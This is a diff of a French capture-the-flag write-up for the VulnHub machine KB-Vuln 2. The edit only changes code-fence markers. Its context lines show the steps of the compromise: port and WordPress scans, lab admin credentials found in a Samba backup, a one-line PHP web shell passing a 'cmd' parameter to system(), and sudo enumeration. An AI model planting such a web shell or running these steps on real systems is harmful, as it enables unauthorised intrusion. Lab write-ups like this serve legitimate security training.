@@ -10,7 +10,7 @@ Voici donc [la suite](https://www.vulnhub.com/entry/kb-vuln-2,562/) du précéde
 
 Un scan de port remonte du Samba et du Apache :  
 
-```plain
+```
 Nmap scan report for 192.168.56.6
 Host is up (0.00032s latency).
 Not shown: 65530 closed tcp ports (reset)
@@ -53,7 +53,7 @@ Host script results:
 
 Sur le serveur web on trouve via énumération des dossiers un wordpress installé. Le module *wp\_enum* de *Wapiti* détecte quelques plugins et thèmes mais rien de critique :  
 
-```plain
+```
 [*] Lancement du module wp_enum
 Enumération des extensions WordPress :
 akismet 4.1.6 détecté
@@ -66,7 +66,7 @@ twentynineteen 1.7 détecté
 
 Avec l'aide de *wpscan* j'obtiens la version du Wordpress :  
 
-```plain
+```
 [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
  | Found By: Emoji Settings (Passive Detection)
  |  - http://192.168.56.6/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.1'
@@ -100,7 +100,7 @@ getting file \backup.zip of size 16735117 as backup.zip (80905,3 KiloBytes/sec) 
 
 A l'intérieur on trouve entre autres un fichier *remember\_me.txt* avec le contenu suivant :  
 
-```plain
+```
 Username:admin
 Password:MachineBoy141
 ```
@@ -132,7 +132,7 @@ if (isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; }
 
 D'après les interfaces réseau on est dans un Docker :  
 
-```plain
+```
 3: docker0:  mtu 1500 qdisc noqueue state DOWN group default 
  link/ether 02:42:21:e3:e8:8c brd ff:ff:ff:ff:ff:ff
  inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
@@ -159,7 +159,7 @@ On peut se connecter aussi directement via SSH mais le service est dans le conta
 
 L'utilisateur a des autorisations *sudo* pour passer root :  
 
-```plain
+```
 kbadmin@kb-server:/$ sudo -l
 [sudo] password for kbadmin: 
 Matching Defaults entries for kbadmin on kb-server:
